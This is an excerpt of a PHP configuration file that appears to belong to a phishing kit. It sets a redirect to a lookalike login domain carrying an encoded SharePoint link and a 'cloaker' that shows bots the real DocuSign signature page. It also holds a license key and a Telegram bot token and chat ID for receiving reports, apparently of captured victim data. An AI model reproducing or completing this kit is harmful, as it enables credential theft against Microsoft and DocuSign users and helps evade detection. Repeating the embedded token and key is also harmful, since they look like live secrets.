...
/*
    ...
    *** Official Version 5.3 ***
*/

$license_key = "ag2u3q868qkriz7qhuf40l8pzy3ew4ky"; // [REQUIRED]

$redirect = "https://login.ailinuxogin.com?qFodlQkeKLc=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN"; // URL or FILE [REQUIRED]
...
$cloaker = [
    "url_to_grab" => "https://www.docusign.com/products/electronic-signature/", // Change the link you want to grap it in your link ( if t)
];
...
$location_bots = "https://www.docusign.com/products/electronic-signature"; // Send The Bots To This Link ( If Cloaker Url Empty )

$view_file_name = "views.php"; // Type PHP Extension Will Be Added Auto Per Example : views.php

$token = "8084663935:AAEZXOX0IdxrYansvK-myyKuU81LSstiS1o"; // Your Token To Receive Rapports

$chatid = "7311543304"; // Your ChatID To Receive Rapports
